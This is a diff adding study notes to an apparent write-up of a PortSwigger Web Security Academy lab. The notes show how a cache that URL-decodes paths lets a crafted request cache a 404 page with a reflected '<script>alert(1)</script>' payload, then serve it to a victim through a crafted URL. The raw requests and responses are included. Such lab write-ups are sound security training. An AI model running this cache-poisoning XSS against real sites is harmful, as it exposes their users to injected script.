@@ -543,4 +543,60 @@ This behavior can allow you to exploit these otherwise "unexploitable" XSS vulne
 As a result, the cache will serve the poisoned response and the payload will be executed client-side. You just need to make sure that the cache is poisoned when the victim visits the URL
 
 ### PRACTITIONER Lab: URL normalization
+First we find cache oracle page
+Now we are trying to find unkeyed inputs: Param miner > Guess everything
+So param miner did not find unkeyed inputs, so the next thing for us to look at is normalization behavior
+
+In burp we change
+```bash
+GET / HTTP/2
+```
+to:
+```bash
+GET %2f HTTP/2
+```
+
+and in the response we get:
+```bash
+HTTP/2 404 Not Found
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=dng4EsyRvqb5l9r3JKjuJFpbQRCHCX6Y; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=10
+Age: 0
+X-Cache: miss
+Content-Length: 21
+
+<p>Not Found: %2f</p>
+```
+
+But what's interesting is that the 404 response is now cached and when other users visit the home page `/` instead of the page they will actually see `Not Found: %2f`
+
+It works like that because **the cache is actually url-decoding the path (it decodes `%2f` before injecting it into the cache)** and after decoding in the cache there will be: `/` 
+So when users visit `/` they will actually see the cached response 
+in this lab's case this means they'll see:
+```bash
+HTTP/2 404 Not Found
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=dng4EsyRvqb5l9r3JKjuJFpbQRCHCX6Y; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=10
+Age: 0
+X-Cache: miss
+Content-Length: 21
+
+<p>Not Found: %2f</p>
+```
+
+And notice that whatever is in the url is reflected in the response
+So in burp we poison the cache:
+```bash
+GET %2f<script>alert(1)</script> HTTP/2
+```
+
+And we craft a malicious url and send it to the victim:
+```bash
+https://0a2d001f03ea0ef880c421ca00bc000f.web-security-academy.net/<script>alert(1)</script>
+```
+
 
